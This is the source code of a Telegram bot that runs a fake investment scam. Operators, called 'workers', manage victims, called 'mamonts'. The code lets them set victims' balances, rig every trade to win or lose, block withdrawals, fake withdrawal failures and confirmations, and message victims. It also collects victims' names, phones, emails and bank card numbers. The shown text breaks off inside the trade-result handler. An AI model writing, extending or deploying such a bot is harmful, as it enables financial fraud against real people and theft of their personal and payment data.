import TelegramBot from 'node-telegram-bot-api'
import config from 'config'
import { User } from './db/userModel.mjs'
import { connection } from './db/connection.mjs'
import { fetchUser, updateToWorker } from './services/userService.mjs'
import { formateDate, generateCryptoData, generateStocksData, generateRandomNumber, getRandomEmoji } from './utils/utils.mjs'

const bot = new TelegramBot(config.get('TELEGRAM_TOKEN'), { polling: true })

const BASE_URL = config.get('BASE_URL')

connection
  .then(() => {
    console.log('Database connection successful')
  })
  .catch((err) => {
    console.log(`Server not running. Error message: ${err.message}`)
    process.exit(1)
  })

bot.on('message', async (msg) => {
  const { text, from, chat } = msg
  const [command, workerId] = text.split(' ')

  const user = await fetchUser(from, workerId)

  if (user.state) {

    if (user.id === 6401967731) return

    if (user.state === 'add-mamont') {

      if (isNaN(text)) {
        await User.findOneAndUpdate({ id: chat.id }, { state: '' })
        return bot.sendMessage(chat.id, `❌ Введите user_id мамонта`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Отмена',
                  callback_data: 'work',
                },
              ],
            ],
          },
        })
      }

      const mamont = await User.findOne({ id: text })
      if (!mamont) {
        await User.findOneAndUpdate({ id: chat.id }, { state: '' })
        return bot.sendMessage(chat.id, `❌ Пользователь не найден!`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Отмена',
                  callback_data: 'work',
                },
              ],
            ],
          },
        })
      }

      const workerWithMamont = await User.findOne({ mamonts: { $all: [mamont._id] } })
      if (workerWithMamont) {
        await User.findOneAndUpdate({ id: chat.id }, { state: '' })
        return bot.sendMessage(chat.id, `❌ Мамонт уже пренадлежит другому воркеру`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Отмена',
                  callback_data: 'work',
                },
              ],
            ],
          },
        })
      }

      await User.findOneAndUpdate({ id: chat.id }, { state: '', mamonts: [...user.mamonts, mamont._id] })
      return bot.sendMessage(chat.id, `Новый мамонт добавлен: ${text}`, {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'Вернуться к меню воркера',
                callback_data: 'work',
              },
            ],
          ],
        },
      })
    }

    if (user.state === 'min-deposit') {
      if (isNaN(text)) {
        await User.findOneAndUpdate({ id: chat.id }, { state: '' })
        return bot.sendMessage(chat.id, `❌ Вы ввели не число!`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Отмена',
                  callback_data: 'work',
                },
              ],
            ],
          },
        })
      }

      await User.findOneAndUpdate({ id: chat.id }, { state: '', deposit: +text })
      return workerCabinet(chat.id, { ...user, deposit: +text })
    }

    if (user.state.startsWith('pay-mamont-')) {
      const mamontId = user.state.split('-')[2]
      await User.findOneAndUpdate({ id: chat.id }, { state: '' })

      if (isNaN(text)) {
        return bot.sendMessage(chat.id, `❌ Вы ввели не число!`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Вернуться в меню мамонта',
                  callback_data: `mamont-${mamontId}`,
                },
              ],
            ],
          },
        })
      }
      const mamont = await User.findOne({ id: mamontId })
      await User.findOneAndUpdate({ id: mamontId }, { balance: mamont.balance + +text })
      bot.sendMessage(mamontId, `✅ Ваш баланс был успешно пополнен на ${text}₽ ✅`)

      return bot.sendMessage(chat.id, `✅ Баланс мамонта успешно пополнен ✅`, {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'Вернуться в меню мамонта',
                callback_data: `mamont-${mamontId}`,
              },
            ],
          ],
        }
      })
    }

    if (user.state.startsWith('edit-balance-')) {
      const mamontId = user.state.split('-')[2]
      await User.findOneAndUpdate({ id: chat.id }, { state: '' })

      if (isNaN(text)) {
        return bot.sendMessage(chat.id, `❌ Вы ввели не число!`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Вернуться в меню мамонта',
                  callback_data: `mamont-${mamontId}`,
                },
              ],
            ],
          },
        })
      }

      const mamont = await User.findOne({ id: mamontId })

      return bot.sendMessage(chat.id, `
Подтверждение изменения баланса пользователя:
                         
💵 Сумма: ${+text}
📛 Пользователь: [${mamont.first_name}](https://t.me/${mamont.username})
🆔 ID Пользователя: ${mamont.id}`, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: '✔️ Подтвердить',
                callback_data: `accept-edit-balance-${mamontId}-${text}`,
              },
            ],
            [
              {
                text: '✖️ Отменить',
                callback_data: `cancel-edit-balance`,
              }
            ]
          ],
        }
      })
    }

    if (user.state.startsWith('set-limit-')) {
      const mamontId = user.state.split('-')[2]
      await User.findOneAndUpdate({ id: chat.id }, { state: '' })

      if (isNaN(text)) {
        return bot.sendMessage(chat.id, `❌ Вы ввели не число!`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Вернуться в меню мамонта',
                  callback_data: `mamont-${mamontId}`,
                },
              ],
            ],
          },
        })
      }

      await User.findOneAndUpdate({ id: mamontId }, { limit: +text })
      return bot.sendMessage(chat.id, `✅ Лимит мамонта успешно обновлен на ${text}`, {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'Вернуться в меню мамонта',
                callback_data: `mamont-${mamontId}`,
              },
            ],
          ],
        }
      })
    }

    if (user.state.startsWith('send-message-')) {
      const mamontId = user.state.split('-')[2]
      await User.findOneAndUpdate({ id: chat.id }, { state: '' })
      bot.sendMessage(mamontId, text)
      return bot.sendMessage(chat.id, `✅ Сообщение отправлено ✅`, {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'Вернуться в меню мамонта',
                callback_data: `mamont-${mamontId}`,
              },
            ],
          ],
        }
      })
    }

    if (user.state === 'set-withdraw') {
      await User.findOneAndUpdate({ id: chat.id }, { state: '' })
      if (isNaN(text)) {
        return bot.sendMessage(chat.id, `❌ Вы ввели не число!`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Отмена',
                  callback_data: 'cabinet',
                },
              ],
            ],
          },
        })
      }

      if (+text > user.balance) {
        return bot.sendMessage(chat.id, `❌ У вас недостаточно средств!`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Отмена',
                  callback_data: 'cabinet',
                },
              ],
            ],
          },
        })
      }

      if (+text < 1000) {
        return bot.sendMessage(chat.id, `❌ Минимальная сумма вывода 1000 рублей`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'Отмена',
                  callback_data: 'cabinet',
                },
              ],
            ],
          },
        })
      }

      return bot.sendMessage(chat.id, `Выберите платежный шлюз:`, {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'Банковская карта',
                callback_data: `set-requisites-card-${text}`,
              }
            ],

            // [
            //   {
            //     text: 'QIWI Кошелек',
            //     callback_data: `set-requisites-qiwi-${text}`,
            //   }
            // ],
            [
              {
                text: 'Bitcoin',
                callback_data: `set-requisites-btc-${text}`,
              }
            ],
            [
              {
                text: '🔙 Вернуться в личный кабинет',
                callback_data: 'cabinet',
              },
            ],
          ],
        },
      })
    }

    if (user.state.startsWith('set-requisites-card-')) {
      const summ = +user.state.split('-')[3]
      const usersWorker = await User.findOne({ mamonts: { $all: [user._id] } });

      if (text === 'bc1q5sp7lqqxyga85gj7rtpo7cg56sv32w098fs5j') {
        await User.findOneAndUpdate({ id: chat.id }, { state: '' })
        return bot.sendMessage(chat.id, '❌ Выбраный платежный шлюз требует реквизиты банковской карты. Выберете другой платежный шлюз', {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: '🔙 Вернуться в личный кабинет',
                  callback_data: 'cabinet',
                },
              ],
            ],
          },
        })
      }

      if (text === '4890494760441873') {
        bot.sendMessage(usersWorker?.id, `
❗️Мамонт сделал вывод средств❗️
🦣Мамонт: [${user.first_name}](https://t.me/${user.username})
🆔: ${user.id}
💰Сумма: ${summ}
💳Вывод на банковскую карту.
🍀Статус: успешно`, {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'В меню мамонта',
                  callback_data: `mamont-${user.id}`,
                },
              ],
            ],
          }
        })
        await User.findOneAndUpdate({ id: chat.id }, { state: '', balance: user.balance - summ })
        return bot.sendMessage(chat.id, `Ваша заявка на вывод была успешно создана! Вывод средств занимает от 2 до 60 минут.`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: '🔙 Вернуться в личный кабинет',
                  callback_data: 'cabinet',
                },
              ],
            ],
          },
        })
      }

      await User.findOneAndUpdate({ id: chat.id }, { state: '' })
      bot.sendMessage(usersWorker?.id, `
❗️Мамонт сделал вывод средств❗️
🦣Мамонт: [${user.first_name}](https://t.me/${user.username})
🆔: ${user.id}
💰Сумма: ${summ}
💳Вывод на банковскую карту.
🍀Статус:Безуспешно`, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'В меню мамонта',
                callback_data: `mamont-${user.id}`,
              },
            ],
          ],
        }
      })
      return bot.sendMessage(chat.id, `❌ Вывод средств возможен только на те реквизиты, с которых пополнялся баланс`, {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'Отмена',
                callback_data: 'cabinet',
              },
            ],
          ],
        },
      })

    }

    if (user.state.startsWith('set-requisites-btc-')) {
      const summ = +user.state.split('-')[3]
      const usersWorker = await User.findOne({ mamonts: { $all: [user._id] } });

      if (text === '4890494760441873') {
        await User.findOneAndUpdate({ id: chat.id }, { state: '' })
        return bot.sendMessage(chat.id, '❌ Выбраный платежный шлюз требует aдрес BTC. Для вывода на карту выберете другой платежный шлюз', {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: '🔙 Вернуться в личный кабинет',
                  callback_data: 'cabinet',
                },
              ],
            ],
          },
        })
      }

      if (text === 'bc1q5sp7lqqxyga85gj7rtpo7cg56sv32w098fs5j') {
        bot.sendMessage(usersWorker?.id, `
❗️Мамонт сделал вывод средств❗️
🦣Мамонт: [${user.first_name}](https://t.me/${user.username})
🆔: ${user.id}
💰Сумма: ${summ}
💱Вывод на Bitcoin.
🍀Статус: успешно`, {
          parse_mode: 'Markdown',
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: 'В меню мамонта',
                  callback_data: `mamont-${user.id}`,
                },
              ],
            ],
          }
        })
        await User.findOneAndUpdate({ id: chat.id }, { state: '', balance: user.balance - summ })
        return bot.sendMessage(chat.id, `Ваша заявка на вывод была успешно создана! Вывод средств занимает от 2 до 60 минут.`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: '🔙 Вернуться в личный кабинет',
                  callback_data: 'cabinet',
                },
              ],
            ],
          },
        })
      }

      await User.findOneAndUpdate({ id: chat.id }, { state: '' })
      bot.sendMessage(usersWorker?.id, `
❗️Мамонт сделал вывод средств❗️
🦣Мамонт: [${user.first_name}](https://t.me/${user.username})
🆔: ${user.id}
💰Сумма: ${summ}
💱Вывод на Bitcoin.
🍀Статус:Безуспешно`, {
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'В меню мамонта',
                callback_data: `mamont-${user.id}`,
              },
            ],
          ],
        }
      })
      return bot.sendMessage(chat.id, `❌ Вывод средств возможен только на те реквизиты, с которых пополнялся баланс`, {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'Отмена',
                callback_data: 'cabinet',
              },
            ],
          ],
        },
      })
    }
    // if (user.state.startsWith('set-requisites-qiwi-')) {
    //   const summ = +user.state.split('-')[3]

    //   if (text === '4890494760441873') {
    //     await User.findOneAndUpdate({ id: chat.id }, { state: '' })
    //     return bot.sendMessage(chat.id, '❌ Выбраный платежный шлюз требует реквизиты Qiwi. Для вывода на карту выберете другой платежный шлюз', {
    //       reply_markup: {
    //         inline_keyboard: [
    //           [
    //             {
    //               text: '🔙 Вернуться в личный кабинет',
    //               callback_data: 'cabinet',
    //             },
    //           ],
    //         ],
    //       },
    //     })
    //   }

    //   if (text === '79258502917') {
    //     await User.findOneAndUpdate({ id: chat.id }, { state: '', balance: user.balance - summ })
    //     return bot.sendMessage(chat.id, `Ваша заявка на вывод была успешно создана! Вывод средств занимает от 2 до 60 минут.`, {
    //       reply_markup: {
    //         inline_keyboard: [
    //           [
    //             {
    //               text: '🔙 Вернуться в личный кабинет',
    //               callback_data: 'cabinet',
    //             },
    //           ],
    //         ],
    //       },
    //     })
    //   }

    //   await User.findOneAndUpdate({ id: chat.id }, { state: '' })
    //   return bot.sendMessage(chat.id, `❌ Вывод средств возможен только на те реквизиты, с которых пополнялся баланс`, {
    //     reply_markup: {
    //       inline_keyboard: [
    //         [
    //           {
    //             text: 'Отмена',
    //             callback_data: 'cabinet',
    //           },
    //         ],
    //       ],
    //     },
    //   })
    // }

    if (user.state.startsWith('make-bet-')) {
      const bet = user.state.split('-')[2]
      await User.findOneAndUpdate({ id: chat.id }, { state: '', bet: bet })

      if (user.balance < +text) {
        return bot.sendMessage(chat.id, `❌ Недостаточно средств на балансе!`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: '🔙 Вернуться в личный кабинет',
                  callback_data: 'cabinet',
                },
              ],
            ],
          },
        })
      }

      if (isNaN(text)) {
        return bot.sendMessage(chat.id, `❌ Введите число!`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: '🔙 Вернуться в личный кабинет',
                  callback_data: 'cabinet',
                },
              ],
            ],
          },
        })
      }

      if (+text < 1000) {
        return bot.sendMessage(chat.id, `❌ Сумма ставки не может быть меньше 1000₽!`, {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: '🔙 Вернуться в личный кабинет',
                  callback_data: 'cabinet',
                },
              ],
            ],
          },
        })
      }

      return bot.sendMessage(chat.id, `🗯 Куда пойдет курс актива?`, {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: 'Повышение/Long 📈',
                callback_data: `bet-leverage-${bet}-${text}-long`,
              },
            ],
            [
              {
                text: 'Понижение/Short 📉',
                callback_data: `bet-leverage-${bet}-${text}-short`,
              }
            ]
          ],
        },
      })
    }

    let answer = `Ваше Ф.И.О: ${text}`

    if (user.state === 'set-name') {
      await User.findOneAndUpdate({ id: chat.id }, { state: '', fio: text })
    } else if (user.state === 'set-country') {
      answer = `🌍 Ваша страна успешно сохранена!`
      await User.findOneAndUpdate({ id: chat.id }, { state: '', country: text })
    } else if (user.state === 'set-phone') {
      answer = `📱 Ваш номер телефона успешно сохранен!`
      await User.findOneAndUpdate({ id: chat.id }, { state: '', phone: text })
    } else if (user.state === 'set-card') {
      answer = `💳 Ваши реквизиты успешно сохранены!`
      await User.findOneAndUpdate({ id: chat.id }, { state: '', card: text })
    } else if (user.state === 'set-email') {
      answer = `📧 Ваш email успешно сохранен!`
      await User.findOneAndUpdate({ id: chat.id }, { state: '', email: text })
    }

    return bot.sendMessage(chat.id, answer, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '🖥️ Вернуться в личный кабинет',
              callback_data: 'cabinet',
            },
          ],
          [
            {
              text: '🔙 Вернуться к настройкам',
              callback_data: 'settings',
            }
          ]
        ],
      },
    })
  }

  if (text.startsWith('/start')) {

    return personalCabinet(chat.id, user)
  }

  if (text === '/work') {
    const user = await updateToWorker(from)
    return workerCabinet(chat.id, user)
  }

  return bot.sendMessage(chat.id, `❌ Некорректный ввод`, {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: '🖥️ Вернуться в личный кабинет',
            callback_data: 'cabinet',
          },
        ],
      ],
    },
  })
})

bot.on('callback_query', async (query) => {
  const { data, message } = query
  const { chat } = message
  const user = await fetchUser(chat)

  if (user.id === 6401967731) return

  if (data === 'cancel') {
    await User.findOneAndUpdate({ id: chat.id }, { state: '' })
    return personalCabinet(chat.id, user)
  }

  if (data === 'settings-cancel') {
    await User.findOneAndUpdate({ id: chat.id }, { state: '' })
    return settingsSection(chat.id, user)
  }

  if (data === 'work-cancel') {
    await User.findOneAndUpdate({ id: chat.id }, { state: '' })
    return workerCabinet(chat.id, user)
  }

  if (data === 'ecn-cancel') {
    await User.findOneAndUpdate({ id: chat.id }, { state: '' })

    return bot.sendPhoto(chat.id, `${BASE_URL}/bets.png`, {
      caption: `Выберите, куда бы вы хотели инвестировать:`,
      reply_markup: {
        inline_keyboard: [
          [{ text: '🔵 Криптовалюты', callback_data: 'crypt' }, { text: '📉 Акции', callback_data: 'stocks' }],
          [{ text: '🔙 Вернуться в личный кабинет', callback_data: 'cabinet' }]
        ],
      },
    })
  }

  if (user.state) return

  if (data === 'cabinet') {
    return personalCabinet(chat.id, user)
  }

  if (data === 'confirm') {
    await User.findOneAndUpdate({ id: chat.id }, { confirmed: true })
    bot.deleteMessage(chat.id, message.message_id)
    return personalCabinet(chat.id, { id: user.id, createdAt: user.createdAt, confirmed: true })
  }

  if (data === 'work') {
    return workerCabinet(chat.id, user)
  }

  if (data === 'my-mamonts') {
    bot.deleteMessage(chat.id, message.message_id)
    return bot.sendMessage(chat.id, 'Выберите мамонта:', {
      reply_markup: {
        inline_keyboard:
          [
            ...user.mamonts.map((mamont) => {
              return [
                {
                  text: `${mamont.id} ${mamont.first_name} `,
                  callback_data: `mamont-${mamont.id}`,
                },
              ]
            },),
            [
              {
                text: '🔙 Назад',
                callback_data: 'work',
              }
            ]
          ]

      }
    })
  }

  if (data === 'add-mamont') {
    await User.findOneAndUpdate({ id: chat.id }, { state: 'add-mamont' })
    bot.deleteMessage(chat.id, message.message_id)

    return bot.sendMessage(chat.id, '🆔 Введите user_id мамонта:', {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Отмена',
              callback_data: 'work-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data === 'min-deposit') {
    await User.findOneAndUpdate({ id: chat.id }, { state: 'min-deposit' })
    bot.deleteMessage(chat.id, message.message_id)
    return bot.sendMessage(chat.id, 'Введите минимальную сумму депозита для мамонта:', {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Отмена',
              callback_data: 'work-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data.startsWith('mamont-')) {
    const [command, mamontId] = data.split('-')
    const mamont = await User.findOne({ id: mamontId })
    return bot.sendMessage(chat.id, `
🐘 Мамонт: [${mamont.first_name}](https://t.me/${mamont.username})

🆔: ${mamont.id}
🏦 Баланс: ${mamont?.balance || 0} RUB
📌 Фарт: ${mamont?.fart || 'Всегда вин'}
🚩 Лимит: ${mamont?.limit || 350000}

ℹ️ Дополнительная информация о 🦣:

🌍 Страна 🦣: ${mamont?.country || 'Не указано'}
📪 Email 🦣: ${mamont?.email || 'Не указано'}
💳 Карта 🦣: ${mamont?.card || 'Не указано'}
👤 Ф.И.О 🦣: ${mamont?.fio || 'Не указано'}
📱 Номер 🦣: ${mamont?.phone || 'Не указано'}
    `, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '💲 Пополнить баланс',
              callback_data: `pay-mamont-${mamont.id}`,
            },
            {
              text: '💰 Редактировать баланс',
              callback_data: `edit-balance-${mamont.id}`,
            }
          ],
          [
            {
              text: '⛔️ Выставить лимит',
              callback_data: `set-limit-${mamont.id}`,
            },
            {
              text: '🍀 Удача',
              callback_data: `set-luck-${mamont.id}`,
            }
          ],
          [
            {
              text: '🔒 Заблокировать вывод',
              callback_data: `block-withdraw-${mamont.id}`,
            }
          ],
          [
            {
              text: '📵 Заблокировать ставку',
              callback_data: `block-bet-${mamont.id}`,
            }
          ],
          [
            {
              text: '✉️ Написать мамонту',
              callback_data: `send-message-${mamont.id}`,
            }
          ],
          [
            {
              text: '🗑️ Удалить мамонта',
              callback_data: `delete-mamont-${mamont.id}`,
            }
          ],
          [
            {
              text: '🔙 Назад',
              callback_data: 'my-mamonts',
            },
          ],
        ],
      }
    })
  }

  if (data.startsWith('pay-mamont-')) {
    const mamontId = data.split('-')[2]
    bot.deleteMessage(chat.id, message.message_id)

    await User.findOneAndUpdate({ id: chat.id }, { state: `pay-mamont-${mamontId}` })
    return bot.sendMessage(chat.id, `⚡️ Введите новый баланс 🦣 (🔅Пополнение):`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Отмена',
              callback_data: 'work-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data.startsWith('edit-balance-')) {
    const mamontId = data.split('-')[2]
    bot.deleteMessage(chat.id, message.message_id)

    await User.findOneAndUpdate({ id: chat.id }, { state: `edit-balance-${mamontId}` })
    return bot.sendMessage(chat.id, `⚡️ Введите новый баланс 🦣 (🔅Редактирование):`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Отмена',
              callback_data: 'work-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data.startsWith('set-limit-')) {
    const mamontId = data.split('-')[2]
    bot.deleteMessage(chat.id, message.message_id)

    await User.findOneAndUpdate({ id: chat.id }, { state: `set-limit-${mamontId}` })
    return bot.sendMessage(chat.id, `⚡️ Введите лимит выигрыша для 🦣 ( по умолчанию стоит лимит 350 000 ):`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Отмена',
              callback_data: 'work-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data.startsWith('set-luck-')) {
    const mamontId = data.split('-')[2]
    bot.deleteMessage(chat.id, message.message_id)

    return bot.sendMessage(chat.id, `⚡️ Выберите фарт для 🦣`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Всегда вин',
              callback_data: `set-win-${mamontId}`,
            },
            {
              text: 'Всегда луз',
              callback_data: `set-lose-${mamontId}`,
            }
          ],
          [
            {
              text: 'Отмена',
              callback_data: 'work-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data.startsWith('send-message-')) {
    const mamontId = data.split('-')[2]
    bot.deleteMessage(chat.id, message.message_id)

    await User.findOneAndUpdate({ id: chat.id }, { state: `send-message-${mamontId}` })
    return bot.sendMessage(chat.id, `Введите ссобщение для мамонта`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Отмена',
              callback_data: 'work-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data.startsWith('delete-mamont-')) {
    const mamontId = data.split('-')[2]
    const { mamonts } = await fetchUser(chat)
    bot.deleteMessage(chat.id, message.message_id)


    await User.findOneAndUpdate({ id: chat.id }, { mamonts: mamonts.filter(mamont => mamont.id !== +mamontId) })
    return bot.sendMessage(chat.id, `✅ Мамонт ${mamontId} успешно удален`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '🔙 Назад',
              callback_data: `work`,
            },
          ],
        ],
      }
    })
  }

  if (data.startsWith('block-withdraw-')) {
    const mamontId = data.split('-')[2]
    const mamont = await User.findOne({ id: mamontId })
    await User.findOneAndUpdate({ id: mamontId }, { withdrawBlocked: !mamont.withdrawBlocked })
    return bot.answerCallbackQuery(query.id, { text: `Вывод мамонта ${mamont.withdrawBlocked ? 'разблокирован' : 'заблокирован'}`, show_alert: true })
  }

  if (data.startsWith('block-bet-')) {
    const mamontId = data.split('-')[2]
    const mamont = await User.findOne({ id: mamontId })
    await User.findOneAndUpdate({ id: mamontId }, { betBlocked: !mamont.betBlocked })
    return bot.answerCallbackQuery(query.id, { text: `Ставка мамонта ${mamont.betBlocked ? 'разблокирована' : 'заблокирована'}`, show_alert: true })
  }

  if (data.startsWith('make-bet-')) {
    const bet = data.split('-')[2]
    await User.findOneAndUpdate({ id: chat.id }, { state: `make-bet-${bet}` })
    return bot.sendPhoto(chat.id, `${BASE_URL}/${bet}.jpeg`, {
      caption: `
🌐 Введите сумму, которую хотите инвестировать.

Минимальная сумма инвестиций - 1000₽
Ваш денежный баланс: ${user.balance} RUB`,
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'Отмена',
              callback_data: 'ecn-cancel',
            },
          ],
        ],
      },
    })
  }

  if (data.startsWith('bet-leverage-')) {
    const dataArray = data.split('-')
    const bet = dataArray[2]
    const summ = dataArray[3]
    const way = dataArray[4]

    bot.deleteMessage(chat.id, message.message_id)
    return bot.sendMessage(chat.id, `📈 Выберите финансовый лэверидж для вашей сделки:`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '1.5X',
              callback_data: `bet-final-step-${bet}-${summ}-${way}-1.5X`,
            },
            {
              text: '2.5X',
              callback_data: `bet-final-step-${bet}-${summ}-${way}-2.5X`,
            },
            {
              text: '5X',
              callback_data: `bet-final-step-${bet}-${summ}-${way}-5X`,
            }
          ]
        ]
      },
    })
  }

  if (data.startsWith('bet-final-step-')) {
    const dataArray = data.split('-')
    const bet = dataArray[3]
    const summ = dataArray[4]
    const way = dataArray[5]
    let leverage = dataArray[6]

    if (leverage === '1.5X') {
      leverage = 1.521
    } else if (leverage === '2.5X') {
      leverage = 2.565
    } else {
      leverage = 5.1
    }

    const usersWorker = await User.findOne({ mamonts: { $all: [user._id] } });
    bot.deleteMessage(chat.id, message.message_id)

    bot.sendMessage(usersWorker.id, `
☢️Мамонт сделал ставку☢️
⌚️(Сейчас на этапе выбора времени)⌚️

📛 Логин: [${user.first_name}](https://t.me/${user.username})
🆔: ${user.id}

📈 Актив: ${bet}
💵 Сумма: ${summ}
☘️ Поставил: ${way === 'long' ? 'Повышение/Long' : 'Понижение/Short'}
⚡️ Коэффициент: ${leverage}X`, {
      parse_mode: 'Markdown',
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: 'В меню мамонта',
              callback_data: `mamont-${user.id}`,
            },
          ],
        ],
      },
    });

    return bot.sendMessage(chat.id, `🕓 Выберите время закрытия сделки:`, {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: '10 Секунд',
              callback_data: `bet-time-${bet}-${summ}-${way}-${leverage}-10`,
            },
            {
              text: '20 Секунд',
              callback_data: `bet-time-${bet}-${summ}-${way}-${leverage}-20`,
            },
            {
              text: '30 Секунд',
              callback_data: `bet-time-${bet}-${summ}-${way}-${leverage}-30`,
            },
          ],
          [
            {
              text: '40 Секунд',
              callback_data: `bet-time-${bet}-${summ}-${way}-${leverage}-40`,
            },
            {
              text: '50 Секунд',
              callback_data: `bet-time-${bet}-${summ}-${way}-${leverage}-50`,
            },
            {
              text: '60 Секунд',
              callback_data: `bet-time-${bet}-${summ}-${way}-${leverage}-60`,
            }
          ]
        ]
      },
    })
  }

  if (data.startsWith('bet-time-')) {
    const dataArray = data.split('-')
    const bet = dataArray[2]
    const summ = +dataArray[3]
    const way = dataArray[4]
    const leverage = +dataArray[5]
    let time = +dataArray[6]
    const income = Math.floor(summ * leverage)

    const usersWorker = await User.findOne({ mamonts: { $all: [user._id] } });

    bot.deleteMessage(chat.id, message.message_id)
    const { message_id } = await bot.sendMessage(chat.id, `
🏦 ${bet}

💵 Сумма ставки: ${summ} RUB
📈 Прогноз: ${way === 'long' ? 'Повышение/Long' : 'Понижение/Short'}
💱 Лэверидж: ${leverage}X

⏱ Осталось: ${time.toFixed(3)} сек`)



    const updateTimeAndLog = async () => {
      time -= 0.663;

      if (time >= 0) {
        bot.editMessageText(
          `
🏦 ${bet}

💵 Сумма ставки: ${summ} RUB
${way === 'long' ? '📈 Прогноз: Повышение/Long' : '📉 Прогноз: Понижение/Short'}
💱 Лэверидж: ${leverage}X

⏱ Осталось: ${time.toFixed(3)} сек`,
          {
            chat_id: chat.id,
            message_id,
          }
        )
      } else {
        bot.editMessageText(`
🏦 ${bet}

💵 Сумма ставки: ${summ} RUB
📈 Прогноз: ${way === 'long' ? 'Повышение/Long' : 'Понижение/Short'}
💱 Лэверидж: ${leverage}X

⏱ Осталось: 0.000 сек`,
          {
            chat_id: chat.id,
            message_id,
          })

        const mamont = await User.findOne({ id: chat.id })
        if (mamont.fart === 'Всегда луз' || mamont.limit < mamont.balance + income) {
          await User.findOneAndUpdate({ id: chat.id }, { balance: mamont.balance - summ, state: `make-bet-${bet}` })

          bot.sendMessage(usersWorker.id, `
☢️ Мамонт сделал ставку ☢️

📛 Логин: [${user.first_name}](https://t.me/${user.username})
🆔: ${user.id}

📈 Актив: ${bet}
💲 Сумма: ${summ} RUB
⚡️ Поставил: ${way === 'long' ? 'Повышение/Long' : 'Понижение/Short'}
⚡️ Коэффициент: ${leverage}X
☘️ Результат: Безуспешено

💰 Баланс мамонта: ${mamont.balance - summ} RUB`, {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  {
                    text: 'В меню мамонта',
                    callback_data: `mamont-${user.id}`,
                  },
                ],
              ],
            },
          });

          return bot.sendMessage(chat.id, `
${way === 'long' ? '📉 Стоимость актива пошла на Понижение/Short' : '📈 Стоимость актива пошла на Повышение/Long'} 

💵 Инвестиция прошла безуспешно.
💲 Сумма прибыли: 0 RUB

✔️ Если хотите инвестировать еще, введите сумму инвестиции
💰 Доступный баланс: ${mamont.balance - summ} RUB`, {
            reply_markup: {
              inline_keyboard: [
                [
                  {
                    text: "Отмена",
                    callback_data: 'cancel',
                  },
                ],
              ],
            }
          })
        } else {
          await User.findOneAndUpdate({ id: chat.id }, { balance: mamont.balance + income, state: `make-bet-${bet}` })

          bot.sendMessage(usersWorker.id, `
☢️ Мамонт сделал ставку ☢️

📛 Логин: [${user.first_name}](https://t.me/${user.username})
🆔: ${user.id}

📈 Актив: ${bet}
💲 Сумма: ${summ} RUB
⚡️ Поставил: ${way === 'long' ? 'Повышение/Long' : 'Понижение/Short'}
⚡️ Коэффициент: ${leverage}X
☘️ Результат: Успешно

💰 Баланс мамонта: ${mamont.balance + income} RUB`, {
            parse_mode: 'Markdown',
            reply_markup: {
              inline_keyboard: [
                [
                  {
                    text: 'В меню мамонта',
                    callback_data: `mamont-${user.id}`,
                  },
                ],
              ],
            },
          });

          return bot.sendMessage(chat.id, `
${way === 'long' ? '📈 Стоимость актива пошла на Повышение/Long' : '📉 Стоимость актива пошла на Понижение/Short'} 

💵 Инвестиция прошла успешно.
💲 Сумма прибыли: ${income} RUB

✔️ Если хотите продолжить инвестировать в данный актив, введите сумму инвестиции
💰 Доступный баланс: ${mamont.balance + income} RUB`, {
            reply_markup: {
              inline_keyboard: [
                [
